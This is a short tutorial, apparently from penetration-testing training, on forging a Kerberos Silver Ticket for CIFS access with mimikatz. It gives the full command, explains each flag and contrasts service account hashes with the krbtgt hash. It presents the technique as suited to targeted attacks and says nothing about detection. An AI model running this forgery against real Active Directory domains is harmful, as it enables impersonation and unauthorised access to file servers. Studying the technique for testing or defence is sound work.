Generating Silver Tickets for Specific Service Access

Practical steps to forge and use a targeted Kerberos ST

# Example of generating a Silver Ticket for CIFS service with mimikatz
kerberos::golden /user:Administrator /domain:<DOMAIN.LOCAL> /sid:<DOMAIN_SID> /rc4:<SERVICE_ACCOUNT_HASH> /service:cifs /target:<TARGET_SERVER_FQDN> /ptt
Key Takeaway

Silver Tickets provide granular access to specific services, making them ideal for targeted attacks where full domain compromise is not the primary goal.

Command Breakdown

  • /user:Administrator: The user to impersonate for the service.
  • /domain:<DOMAIN.LOCAL>: The target Active Directory domain.
  • /sid:<DOMAIN_SID>: The Security Identifier of the domain.
  • /rc4:<SERVICE_ACCOUNT_HASH>: The NTLM hash of the specific service account.
  • /service:cifs: The target service (e.g., CIFS for file shares).
  • /target:<TARGET_SERVER_FQDN>: The FQDN of the server hosting the service.
  • /ptt: Pass The Ticket, injects the forged ST into the current session.
Common Mistake

A common error is confusing the krbtgt hash (for Golden Tickets) with a specific service account hash (for Silver Tickets). Each requires a different hash for its respective purpose.
